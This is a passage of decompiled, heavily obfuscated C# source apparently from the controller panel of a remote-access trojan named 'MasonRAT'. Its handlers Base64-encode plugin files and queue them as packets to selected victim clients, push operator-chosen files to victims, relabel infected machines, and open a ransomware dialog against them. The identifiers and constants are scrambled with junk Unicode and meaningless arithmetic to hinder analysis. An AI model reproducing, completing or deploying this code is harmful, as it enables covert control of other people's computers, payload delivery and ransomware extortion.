      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1882) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1883))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cْٺـٸڙـڙڙۜ\u060Dڼ(object sender, EventArgs e)
  {
    System.Diagnostics.Process.Start(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1884));
    System.Diagnostics.Process.Start(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1885));
    System.Diagnostics.Process.Start(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1886));
    System.Diagnostics.Process.Start(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1887));
  }

  private void \u2694️MasonRAT\u270Cـۭؤ̨̍\u0609ٺڛ\u060D\u060Aۚ\u0609(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    string Left = Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1888), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1889), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1890), ((1770499691 - 1519759914 % 1325525642 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) > (568668675 ^ 7) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 ? (182074049 > 1256669598 ? -1 : -1) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 : (1536619779 > 972767255 ? -1 : -1) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1), ((2052983589 ^ 149856578 >> 1148625650) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + -(979241247 + (1538162737 << 1854429950) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0));
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1891) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Left);
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
    try
    {
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          if (Operators.CompareString(Left, (string) null, false) == 0)
            selectedItem.SubItems[511593447 + (1346296696 | 1841072733) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 - -(1047584681 + 626129150 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0].Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1892);
          else
            selectedItem.SubItems[(497645152 ^ -586646788) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 + (410513467 - 907214284 % 619568640 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 | (1752830637 > 1816449070 ? 1411766748 : 1058825061) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 ^ 0].Text = Left;
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Debug.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cــڙـ\u0608\u060Bڙۭـﮪ\u060Cـ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    OpenFileDialog openFileDialog1 = new OpenFileDialog();
    OpenFileDialog openFileDialog2 = openFileDialog1;
    openFileDialog2.Title = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1893);
    openFileDialog2.Filter = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1894);
    if (openFileDialog1.ShowDialog() == DialogResult.OK)
    {
      string fileName = openFileDialog1.FileName;
      try
      {
        string[] strArray = new string[(-2102964497 - (1509282159 | 1852376567) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) - ((1857020206 > 1973524535 ? 952767389 : 714575542) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 >> ((1484533681 | 173460822) - 1046199539 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0];
        strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1895);
        strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[335919498 - (1812661389 << 1989069529) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 - -(97509511 + (1422648299 >> 690086921) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0)] = Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1896)));
        strArray[((2068536908 > 1294650782 ? -644709847 : -859613129) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + (1971995416 - 1394479760 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 | -1151788770 - ~1259099323 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 ^ 0)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[(-110639126 - 1028010854 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) - (-1349375057 - 1310320774 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 << (1404799335 - (1150663726 << 1774158631) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0] = Convert.ToBase64String(File.ReadAllBytes(fileName));
        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) MessageBox.Show(ex.Message);
        ProjectData.ClearProjectError();
      }
    }
  }

  private void \u2694️MasonRAT\u270Cڙ\u060A\u060Aىڙــــ\u0609ڙ\u060Bڛب(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1897) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1898))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u060Fٺـۡـڙۜ\u060C\u060Fـح\u0609ـۙ\u0608ٸۛ\u060Aـ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    int num = (int) new Ransomware().ShowDialog();
  }

  private void \u2694️MasonRAT\u270Cڅــڙۙؤ\u060Cڙ\u060A\u060Fـٺب\u060Dڠـ\u0608ـڙ(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cڼ\u060D\u0609\u060Dءـ\u0609̍ـ\u0608ڙٺ\u060A̍(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1899) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1900))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u0609ــىد\u0609ــڙ\u060C؁ـ\u0608\u060Aﮪ(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cـ\u0608\u0609\u060D\u0608ـ\u0609ـڙـ\u0608ۡ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      object Right = (object) Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1901), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1902), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1903), ((-180295783 ^ -1625555212) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ ~((1917569225 | 2014344053) - 268493456 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0, ((-1610612747 ^ 149269068 << 1782841819) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 ^ (368009397 ^ 430516646 >> 1598950733) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 >> 136674645 - (175873820 >> 550563366) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0);
      if (!string.IsNullOrWhiteSpace(Conversions.ToString(Right)))
      {
        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1904) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1905))) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), Right), (object) Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1906))));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
